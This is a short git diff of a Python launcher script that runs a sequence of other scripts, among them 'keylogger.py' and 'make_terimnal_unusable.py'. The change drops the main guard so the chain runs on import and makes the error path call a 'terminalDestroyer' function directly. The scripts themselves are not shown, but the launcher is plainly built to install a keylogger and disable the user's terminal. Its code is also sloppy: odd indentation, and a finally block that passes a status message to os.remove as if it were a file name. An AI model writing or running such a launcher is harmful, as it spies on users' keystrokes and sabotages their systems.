@@ -4,16 +4,15 @@ import os
 import subprocess
 
 
-if __name__ == '__main__':
-    try:
+try:
         subprocess.run(["python", "background_runner.py"])
         subprocess.run(["python", "test.py"])
         subprocess.run(["python", "test1.py"])
         subprocess.run(["python", "make_terimnal_unusable.py"])
         subprocess.run(["python", "keylogger.py"])
         subprocess.run(["python", "make_terimnal_unusable.py"])
-    except Exception:
-        background_runner.run_in_background(make_terimnal_unusable.terminalDestroyer())
+except Exception:
+        make_terimnal_unusable.terminalDestroyer()
 
-    finally:
-        os.remove("test1.py")
+finally:
+        os.remove('code runned successful')
